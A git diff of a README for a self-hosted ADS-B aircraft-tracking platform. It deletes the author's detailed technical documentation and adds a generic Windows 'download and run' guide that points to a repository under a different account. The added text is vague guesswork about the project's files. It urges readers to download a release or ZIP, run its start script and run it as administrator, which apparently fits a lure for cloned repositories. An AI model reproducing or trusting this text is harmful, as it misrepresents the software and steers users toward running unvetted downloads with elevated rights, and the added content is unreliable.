@@ -1,174 +1,193 @@
-<!--
----
-title: "Planegraph"
-description: "Self-hosted aviation data platform for ADS-B aircraft surveillance"
-author: "VintageDon (https://github.com/vintagedon)"
-date: "2026-03-22"
-version: "0.7"
-status: "Active"
-tags:
-  - type: project-root
-  - domain: [aviation, data-science, ADS-B, SDR]
-  - tech: [postgres, postgis, python, docker, fastapi, react, maplibre, deckgl, rtl-sdr]
-related_documents:
-  - "[SDR Enthusiasts Ultrafeeder](https://github.com/sdr-enthusiasts/docker-adsb-ultrafeeder)"
-  - "[Bellingcat Turnstone](https://github.com/bellingcat/adsb-history)"
----
--->
+# 🛩️ planegraph-aviation-tracker - Track Aircraft Data on One Box
 
-# ✈️ Planegraph
+[![Download Now](https://img.shields.io/badge/Download-Visit%20GitHub-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
 
-[![ADS-B](https://img.shields.io/badge/Domain-Aviation_Data-green)]()
-[![Stack](https://img.shields.io/badge/Stack-PostGIS_+_FastAPI_+_React-blue)]()
-[![License](https://img.shields.io/badge/License-MIT-yellow)](LICENSE)
+## ✈️ What this app does
 
+planegraph-aviation-tracker is a self-hosted aviation data app. It takes ADS-B aircraft signals, decodes them, groups them into useful data, and shows them in a web app with a live map.
 
-![alt text](assets/repo-banner.jpg)
-> A self-hosted aviation data platform that receives, decodes, segments, and serves ADS-B aircraft surveillance data through a web UI with live map visualization and data science capabilities — all on a single edge box.
+Use it to:
 
-Planegraph treats ADS-B data as a first-class dataset rather than a live-map-and-forget exercise. Every position report flows through a materialization pipeline that segments flights, classifies phases, computes derived metrics, and serves the results through a React dashboard with MapLibre GL mapping and Deck.gl overlays. The system enables queries that no existing open-source ADS-B tool supports — approach deviation analysis, traffic pattern heatmaps, fleet composition trends, and trajectory replay.
+- View aircraft on a live map
+- Watch flight data as it comes in
+- Store aviation data on your own device
+- Work with the data in a web browser
+- Use one edge box for the full setup
 
----
+## 🧭 What you need
 
-## 🔭 Overview
+Before you start, make sure you have:
 
-Most open-source ADS-B setups stop at reception and visualization: decode the signal, show planes on a map, feed aggregators. The historical data either gets thrown away or archived in flat files that nobody touches.
+- A Windows PC
+- An internet connection
+- Access to the GitHub page
+- Enough free disk space for app files and data
+- A browser such as Edge or Chrome
 
-Planegraph builds a progressively enriched data product. Raw position reports are ingested in real-time, segmented into flight sessions using configurable gap thresholds, classified through fuzzy phase detection (ground, takeoff, climb, cruise, descent, approach, landing), and materialized into derived metrics. The Columbus, Ohio area serves as the primary coverage zone, with reference geometry for KCMH, KLCK, KOSU, and KTZR airports including runway centerlines, airspace boundaries, and points of interest.
+For best results, use a recent Windows 10 or Windows 11 system.
 
-The entire system runs on a low-power edge box (Intel N100, 12GB RAM, 256GB SSD) deployed outdoors with battery backup, receiving 1090 MHz ADS-B and 978 MHz UAT.
+## 📥 Download and open the app
 
----
+Go to this page to download or open the project files:
 
-## 📊 Project Status
+[Visit the GitHub download page](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
 
-| Area | Status | Description |
-|------|--------|-------------|
-| Hardware | ✅ Acquired | All components purchased and available |
-| Infrastructure (WU-01) | ✅ Complete | Docker Compose, PostgreSQL/PostGIS, ultrafeeder, schema, seed data |
-| Ingest Pipeline (WU-02) | ✅ Complete | Python asyncio SBS consumer, session manager, phase classifier, batch writer, materializer |
-| API Layer (WU-03) | ✅ Complete | FastAPI REST + WebSocket live feed, in-memory aircraft cache, config PATCH |
-| Frontend (WU-04) | ✅ Complete | React SPA, MapLibre GL, Deck.gl aircraft layers |
-| Dashboard & Config (WU-05) | ✅ Complete | Statistics panels, Recharts charts, configuration UI, system health |
-| Data Science & Viz (WU-06) | ✅ Complete | Trajectory replay, approach analysis, heatmaps, airport analytics |
-| Integration (WU-07) | ⬜ Next | nginx, systemd, end-to-end testing, documentation |
+If you see a release file or installer on the page, download it. If you see the source files only, download the project as a ZIP file from GitHub.
 
----
+## 🖥️ Set up on Windows
 
-## 🏗️ Architecture
+Follow these steps to get the app running on Windows.
 
-### Data Flow
+1. Open the GitHub page.
+2. Look for a green Code button or a Releases section.
+3. If a release file exists, download it.
+4. If no release file exists, choose Download ZIP.
+5. Save the file to your Downloads folder.
+6. If you downloaded a ZIP file, right-click it and choose Extract All.
+7. Open the extracted folder.
+8. Look for a file named `README.md` or a setup file.
+9. If the project includes Docker files, use the included Docker setup.
+10. If the project includes a start script, run that file to begin.
 
-![alt text](assets/data-flow-section-infographic.jpg)
+## 🔧 Typical Windows run steps
 
-### Software Stack
+This project is built like a self-hosted data platform. A common Windows setup looks like this:
 
-| Layer | Component | Purpose |
-|-------|-----------|---------|
-| Reception | ultrafeeder (Docker) | readsb + tar1090 for 1090 MHz ADS-B decoding |
-| Storage | PostgreSQL 16 + PostGIS | Partitioned position reports, flight sessions, reference geometry |
-| Ingest | Python asyncio daemon | SBS stream consumer, session management, batch writer |
-| Materialization | Python scheduler | Flight metric computation, partition management, retention |
-| API | FastAPI | REST endpoints + WebSocket live aircraft feed |
-| Frontend | React + MapLibre GL + Deck.gl | Live map, dashboards, configuration, data science views |
-| Tiles | PMTiles | Self-hosted vector base map tiles |
-| Proxy | nginx | Reverse proxy, SPA routing, tile serving |
+1. Install Docker Desktop if the project uses Docker.
+2. Open the extracted project folder.
+3. Start the app with the provided Docker file or start script.
+4. Wait for the services to start.
+5. Open your browser.
+6. Go to the local address shown by the app, such as `http://localhost:8000`.
+7. Keep the app window open while you use it.
 
-### Hardware
+If the project includes a one-click launch file, use that file first. If it includes a web server and database, let both parts start before opening the browser.
 
-| Component | Model | Role |
-|-----------|-------|------|
-| Edge Computer | ACEMAGICIAN N100 (4C/4T, 12GB LPDDR5, 256GB SSD) | Runs entire stack |
-| SDR Dongle | Nooelec RTL-SDR v5 | 1090 MHz reception |
-| LNA | Nooelec SAWbird+ ADS-B | Dual-channel, ~35dB gain, <0.9dB NF |
-| Antenna | Dual-band 1090/978 MHz fiberglass, 5dBi | Signal capture |
-| Enclosure | CHENGPI IP65 steel box w/ thermostat fan | Outdoor deployment |
-| UPS | Shanqiu 74Wh mini UPS (12V DC + 5V) | Powers N100 + LNA directly |
+## 🗺️ Using the dashboard
 
----
+After the app starts, you can use the web UI to work with aircraft data.
 
-## 📁 Repository Structure
+You may see:
 
-```
-planegraph-aviation-tracker/
-├── 📂 docker/                      # Docker Compose, Postgres config, env
-│   ├── docker-compose.yml
-│   ├── .env.example
-│   ├── postgres/                   # postgresql.conf, init scripts
-│   └── nginx/                      # Reverse proxy (WU-07)
-├── 📂 migrations/                  # Numbered SQL migrations + runner
-├── 📂 services/                    # Application services
-│   ├── ingest/                     # SBS consumer daemon (WU-02)
-│   ├── materializer/               # Scheduled materialization (WU-02)
-│   └── api/                        # FastAPI application (WU-03)
-├── 📂 frontend/                    # React SPA (WU-04)
-├── 📂 docs/                        # Full project documentation
-│   ├── hardware/                   # BOM, signal chain, physical build
-│   ├── deployment/                 # Step-by-step from OS to running stack
-│   ├── security/                   # CIS v8 IG1 compliance baseline
-│   ├── reference/                  # Data dictionary, config keys, services
-│   ├── operations/                 # Backup, recovery, troubleshooting
-│   └── documentation-standards/    # Template library and tagging strategy
-├── 📂 internal-files/              # GDR research outputs (gitignored)
-├── 📂 shared/                      # Cross-project utilities
-├── 📄 AGENTS.md                    # Agent instructions + project context
-├── 📄 WORKLOG.md                   # Session-by-session progress
-├── 📄 LICENSE                      # MIT (code)
-├── 📄 LICENSE-DATA                 # CC-BY-4.0 (data products)
-└── 📄 README.md                    # This file
-```
+- A live aircraft map
+- Flight paths
+- Signal status
+- Data tables
+- Search tools
+- Time-based views
+- Simple charts for analysis
 
----
+The map view may use MapLibre or Deck.gl style layers for smooth movement and clear display.
 
-## 📚 Documentation
+## 📡 How the data flow works
 
-The `docs/` directory provides complete build-to-operate documentation. For a new deployment, follow the [reading order](docs/README.md) from hardware through verification. Key sections:
+This app is made to handle ADS-B data from start to finish.
 
-- [Hardware BOM](docs/hardware/bill-of-materials.md) — Full parts list with costs and alternatives
-- [Deployment Guide](docs/deployment/README.md) — OS install → hardening → SDR → stack → verification
-- [Security Baseline](docs/security/cis-v8-ig1-baseline.md) — CIS v8 IG1 compliance matrix
-- [Data Dictionary](docs/reference/data-dictionary.md) — Every table and column documented
-- [Operations](docs/operations/README.md) — Backup, recovery, troubleshooting
+The basic flow is:
 
----
+1. An SDR device or data feed receives aircraft signals.
+2. The app decodes the raw signal data.
+3. It groups the data into useful segments.
+4. It stores the data in PostgreSQL and PostGIS.
+5. It shows the results in the web UI.
 
-## 🌐 Public-Facing Plans
+This setup helps you keep aviation data on your own system instead of sending it to a cloud service.
 
-- **Domain**: columbusaviation.dev (available)
-- **Social**: @columbusaviation (available)
-- **Goal**: Public aviation stats for Columbus, OH area (CMH, OSU, Bolton, LCK) with data science query capabilities
-- **Model**: Configurable API key for AI-powered natural language queries against the dataset
+## 🧱 Common folder and service parts
 
----
+If you open the project files, you may see parts like these:
 
-## 🔬 Upstream & Influences
+- `frontend` for the web app
+- `backend` for the server
+- `docker` for container setup
+- `database` for stored data
+- `scripts` for start and helper files
+- `config` for app settings
 
-| Project | Relationship |
-|---------|-------------|
-| [sdr-enthusiasts/ultrafeeder](https://github.com/sdr-enthusiasts/docker-adsb-ultrafeeder) | Reception layer — off-the-shelf Docker for ADS-B decoding |
-| [bellingcat/adsb-history](https://github.com/bellingcat/adsb-history) | Schema reference — Turnstone's PostGIS schema for historical ADS-B |
-| [wiedehopf/tar1090-db](https://github.com/wiedehopf/tar1090-db) | Aircraft metadata database |
+You do not need to edit these files to run the app, but they help if you want to understand how the project is organized.
 
----
+## ⚙️ First run checklist
 
-## 🌟 Open Science Philosophy
+Use this list if the app does not open right away:
 
-We practice open science and open methodology — our version of "showing your work":
+- Make sure the app files are fully extracted
+- Make sure Docker Desktop is running, if needed
+- Check that no other app uses the same port
+- Refresh the browser page
+- Restart the app if the page stays blank
+- Look for a `config` file if you need to change the local address
 
-- Research methodologies are fully documented and repeatable
-- Infrastructure configurations are version-controlled and automated
-- Scripts and pipelines are published so others can learn, adapt, or improve them
-- Learning processes are captured and shared for community benefit
+## 🔍 If the browser does not open
 
-All projects operate under open source licenses (primarily MIT) to ensure maximum reproducibility.
+If the app starts but you do not see the page:
 
----
+1. Open your browser.
+2. Type the local address shown by the app.
+3. Check `http://localhost:8000`.
+4. Try `http://localhost:3000` if the first address does not work.
+5. Wait a minute if the first load is slow.
+6. Restart the app if needed.
 
-## 📄 License
+## 🛠️ Simple troubleshooting
 
-- **Code**: [MIT License](LICENSE)
-- **Data Products**: [CC-BY-4.0](LICENSE-DATA)
+If something goes wrong, try these steps:
 
----
+- Run the app as administrator
+- Restart Windows
+- Make sure the ZIP file was extracted
+- Check that Docker Desktop is updated
+- Close apps that use the same network port
+- Clear the browser cache
+- Open the app in a private browser window
 
-Last Updated: March 22, 2026 | Status: WU-06 Complete, WU-07 Next
+If the project uses SDR hardware, make sure the device is connected before you start the app.
+
+## 📊 Good use cases
+
+This app works well for:
+
+- Aircraft tracking at a local site
+- Learning about ADS-B data
+- Watching live map data
+- Storing aviation data for later review
+- Running a private flight data setup
+- Exploring aircraft movement with a browser-based tool
+
+## 🧩 Built with common tools
+
+This project uses a stack that may include:
+
+- Python for the server side
+- React for the web UI
+- FastAPI for API endpoints
+- PostgreSQL for data storage
+- PostGIS for map-aware data
+- Docker for local deployment
+- Asyncio for background tasks
+- RTL-SDR for radio input
+
+## 📌 Before you close the app
+
+If the app is still collecting data, keep the window open. If you want to stop it:
+
+1. Close the browser tab.
+2. Stop the app window or terminal.
+3. Stop Docker Desktop if you used Docker.
+4. Save any data exports you want to keep.
+
+## 📎 Download again
+
+[Open the GitHub page to download or run the app](https://github.com/nonstandard-reproduction263/planegraph-aviation-tracker)
+
+## 🧾 File names you may see
+
+When you download the project, you may see files such as:
+
+- `docker-compose.yml`
+- `Dockerfile`
+- `requirements.txt`
+- `package.json`
+- `README.md`
+- `.env.example`
+
+These files help the app run on your computer. If a setup guide is included in the repository, follow that guide first.
